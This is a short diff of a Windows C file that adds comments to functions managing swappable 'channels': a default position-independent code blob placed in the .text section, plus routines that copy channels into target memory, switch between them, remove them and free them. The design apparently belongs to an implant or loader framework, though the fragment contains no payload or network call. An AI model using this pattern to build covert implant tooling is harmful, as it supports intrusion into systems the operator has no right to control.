@@ -5,9 +5,11 @@ BYTE		g_DefaultChannelConfig[] = { 0x0 }; // TODO: pass config as argument like 
 LIST_ENTRY	g_ChannelList;
 PCHANNEL	g_Channel;
 
+// Channel PIC
+//
 __attribute__((section(".text"))) BYTE g_DefaultChannel[] = DEFAULT_CHANNEL;
 
-// ChannelInitialize
+// ChannelInitialize initialize list then insert default channel
 //
 BOOL ChannelInitialize() {
 	
@@ -55,11 +57,15 @@ BOOL ChannelRegister(PVOID BaseAddr, DWORD Size) {
 	return TRUE;
 }
 
+// ChannelLoad load channel into target memory
+//
 BOOL ChannelLoad(PVOID Destination, PVOID Source, DWORD Size) {
 	memcpy(Destination, Source, Size);
 	return TRUE;
 }
 
+// ChannelSwitch switch to a registered channel
+//
 BOOL ChannelSwitch(DWORD ID) {
 	LIST_ENTRY* current = g_ChannelList.Flink;
 
@@ -81,6 +87,8 @@ BOOL ChannelSwitch(DWORD ID) {
 	return FALSE;
 }
 
+// ChannelRemove remove channel
+//
 BOOL ChannelRemove(DWORD ID) {
 	LIST_ENTRY* current = g_ChannelList.Flink;
 
@@ -100,6 +108,8 @@ BOOL ChannelRemove(DWORD ID) {
 	return FALSE;
 }
 
+// ChannelFree free channel
+//
 VOID ChannelFree(PCHANNEL Channel) {
 	VirtualFree(Channel->Memory.Base, Channel->Memory.Size, MEM_RELEASE);
 	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Channel->Interface);
